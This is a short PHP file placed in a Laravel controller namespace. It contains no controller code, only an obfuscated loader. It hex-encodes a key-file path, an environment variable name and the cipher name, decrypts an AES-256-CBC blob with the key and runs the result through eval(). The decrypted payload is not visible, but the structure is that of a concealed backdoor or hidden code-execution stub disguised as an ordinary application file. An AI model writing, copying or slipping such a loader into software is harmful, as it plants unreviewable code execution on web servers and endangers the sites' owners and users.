<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('aya7TODuYtkAn5QpKTPNpA==');

$c=base64_decode(

'rTg75Is/245U6utokJ78rb9Vb8rxqVcXcX7NZqoZm/zNp3qRHG89VveRpNvHjzXRwfcO39we3o/b' .
'lLtjYSc1IFBO/Jrce4NEPeOYwj8Ib8aE/GR8BTLziN1VgaWuJG7hA3L6q5vv6dj6YvgYm1QCxNJF' .
'sdesfQd6hllqHV+g8RO7E/OmKroMpiprHRWlTCxrLWPz/dLf7VFUn+qFISMk0dSBo7o6+gyFCbDx' .
'cwRE3Gk/haJ1Y09B0u6Jo/SDLqTqe5OhzCwh1ICvll1xa21a6Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

